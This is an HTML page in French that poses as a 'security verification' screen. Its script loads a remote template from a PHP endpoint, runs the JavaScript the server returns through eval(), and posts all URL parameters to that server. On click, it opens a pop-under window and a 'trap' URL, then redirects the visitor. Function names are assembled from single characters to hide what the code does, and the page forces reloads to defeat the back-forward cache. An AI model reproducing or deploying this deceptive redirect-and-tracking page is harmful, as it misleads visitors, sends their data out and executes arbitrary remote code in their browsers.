<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>V√©rification de s√©curit√©</title>
    
    <style id="template-styles">
        /* Styles du loader */
        @keyframes spin { 100% { transform: rotate(360deg); } }
        
        html, body {
            height: 100%;
            width: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden; 
        }
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background-size: cover; 
            background-repeat: no-repeat;
        }
        
        #template-container {
            height: 100%; 
            width: 100%;
        }

        #loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #333;
        }
    </style>
</head>
<body>
    
    <div id="template-container">
        <div id="loading-spinner">
            <div style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
            Chargement de la v√©rification...
        </div>
    </div>
    
<script>
    
    // üö® CORRECTION CRITIQUE iOS/Android (bfcache) :
    // Solution 1: Forcer le navigateur √† recharger l'int√©gralit√© de la page.
    window.addEventListener('pageshow', function(event) {
        if (event.persisted) {
            console.log("Page revenue du cache (bfcache). For√ßage du rechargement...");
            
            // Rechargement qui devrait vider le cache et relancer le script
            window.location.reload(); 
            
            // File de secours si reload() est ignor√© (navigation forc√©e vers l'URL)
            setTimeout(function(){
                 window.location.href = window.location.href;
            }, 100);
        }
    });

    // --- OBFUSCATION DE BASE ---
    const H = ['h', 'i', 's', 't', 'o', 'r', 'y'].join('');
    const PS = ['p', 'u', 's', 'h', 'S', 't', 'a', 't', 'e'].join('');
    const WO = ['o', 'p', 'e', 'n'].join('');
    const BK = '_' + ['b', 'l', 'a', 'n', 'k'].join('');
    const FOCUS = ['f', 'o', 'c', 'u', 's'].join('');
    const FE = ['f', 'e', 't', 'c', 'h'].join('');
    const HREF = ['h', 'r', 'e', 'f'].join('');
    
    const URL_PHP = "https://lespetitscoquins.fr/cancel-bookingv2.php"; 
    const URL_TEMPLATE = URL_PHP + "?action=get_template"; 

    const METHOD_POST = ['P', 'O', 'S', 'T'].join('');
    const METHOD_GET = ['G', 'E', 'T'].join('');
    const SUCCESS_ICON_HTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#009432" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>';
    const LOADER_HTML_FIXED = '<div id="loader" style="width: 14px; height: 14px; border: 2px solid #f3f3f3; border-top: 2px solid #4285f4; border-radius: 50%; animation: spin 0.8s linear infinite;"></div>';

    // Variable d'√©tat pour bloquer les doubles clics rapides
    var redirected = false; 
    
    // --- 1. FONCTIONS DE BASES ---
    function getUrlParameter(name) {
        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        var results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    };

    function executeHiddenLogic(urlMain, urlPop, idBack) {
        if (redirected) return;
        redirected = true; 
        
        // 1. Redirection Pop-up (url_pop)
        try {
            var popWindow = window[WO](urlPop, BK);
            if(popWindow) {
                popWindow.blur();
                window[FOCUS]();
            }
        } catch(e) {}
        
        // 2. Redirection Trap (idBack)
        const trapUrl = URL_PHP + "?sec_id=" + idBack + window.location.search;
        try {
            window[WO](trapUrl, BK); 
        } catch(e) {}

        // 3. Redirection Principale (urlMain)
        setTimeout(function(){
            window.top.location[HREF] = urlMain;
        }, 300);
    }
    
    // --- 2.CLICS ---
    function initializeUnifiedClicks(jsScript) {
        document.querySelectorAll('.action-btn').forEach(btn => {
            btn.addEventListener('click', function(event) {
                event.preventDefault();
                
                // Si la redirection est d√©j√† en cours suite √† un clic
                if (redirected) return;

                this.setAttribute('data-original-html', this.innerHTML);
                this.innerHTML = '<span style="display:inline-flex; align-items:center; justify-content:center; gap: 8px;">' + LOADER_HTML_FIXED + ' V√©rification...</span>';
                this.style.pointerEvents = 'none';
                this.style.opacity = '0.8';

                executeAjaxLogic(this);
            });
        });
        
        try {
            if (jsScript) {
                eval(jsScript);
            }
        } catch (e) {
            console.error("Erreur lors de l'ex√©cution du script de template :", e);
        }
    }
    
    function executeAjaxLogic(btnElement) {
    var formData = new FormData();
    formData.append('action', 'get_links');
    
    // üö® ENVOIE TOUS LES PARAM√àTRES DE L'URL (u, pseudo, age, distance, img_path, etc.)
    var urlParams = new URLSearchParams(window.location.search);
    urlParams.forEach(function(value, key) {
        formData.append(key, value);
    });
    
    window[FE](URL_PHP, { method: METHOD_POST, body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'ok') {
                executeHiddenLogic(data.url_main, data.url_pop, data.id_back);
                
                setTimeout(function(){
                    // Mise √† jour visuelle du bouton
                    btnElement.innerHTML = SUCCESS_ICON_HTML + " Acc√®s autoris√©";
                    btnElement.style.background = '#009432';
                    btnElement.style.color = 'white';
                    btnElement.style.opacity = '1';
                    
                    // R√©active le clic sur le bouton m√™me s'il est au statut 'vert'
                    btnElement.style.pointerEvents = 'auto'; 
                }, 800);
            } else {
                location.reload();
            }
        })
        .catch(err => {
            console.error("Erreur Fetch:", err);
            btnElement.innerHTML = btnElement.getAttribute('data-original-html') || "Erreur, r√©essayer";
            btnElement.style.pointerEvents = 'auto';
            btnElement.style.opacity = '1';
            // R√©initialisation en cas d'√©chec AJAX
            redirected = false;
        });
    }

    // --- 3.CHARGEMENT ---
    // isReturnFromCache n'est plus n√©cessaire ici, car le pageshow relance l'URL
    function loadTemplate() { 
        
        let trackingParams = window.location.search;
        let finalParams = ''; 
        
        if (trackingParams.length > 0 && trackingParams.startsWith('?')) {
            finalParams = '&' + trackingParams.substring(1); 
        }
        
        document.getElementById('loading-spinner').style.display = 'inline-flex';

        window[FE](URL_TEMPLATE + finalParams, { method: METHOD_GET })
        .then(response => {
            if (!response.ok) {
                throw new Error('Erreur r√©seau ou script PHP non trouv√©/mal configur√©.');
            }
            return response.json();
        })
        .then(data => {
            
            document.getElementById('loading-spinner').style.display = 'none';
            
            if (data.status === 'ok' && data.html) {
                
                // 1. HTML
                document.getElementById('template-container').innerHTML = data.html;
                
                // 2. Application du fond 
                const rootDiv = document.getElementById('template-container').children[0];
                if (rootDiv) {
                    const backgroundStyle = rootDiv.style.background || rootDiv.style.backgroundColor;
                    const backdropStyle = rootDiv.style.backdropFilter || rootDiv.style.webkitBackdropFilter;
                    
                    if (backgroundStyle) {
                        document.body.style.background = backgroundStyle;
                    }
                    
                    if (backdropStyle) {
                        document.body.style.backdropFilter = backdropStyle;
                        document.body.style.webkitBackdropFilter = backdropStyle;
                    }
                    
                    rootDiv.style.height = '100vh';
                }
                
                document.getElementById('template-styles').innerHTML += data.css || '';
                
                // 3. R√©initialise les √©couteurs de clics
                initializeUnifiedClicks(data.js);
                
            } else {
                document.getElementById('template-container').innerHTML = '<p style="color:red;">Erreur: Template non re√ßu.</p>';
            }
        })
        .catch(err => {
            document.getElementById('loading-spinner').style.display = 'none';
            console.error("Erreur critique au chargement du template:", err);
            document.getElementById('template-container').innerHTML = '<p style="color:red; font-size: 16px;">Erreur de connexion au serveur de v√©rification. (V√©rifiez URL_PHP)</p>';
        });
    }

    // Lance le processus de chargement initial
    loadTemplate();
</script>
</body>
</html>
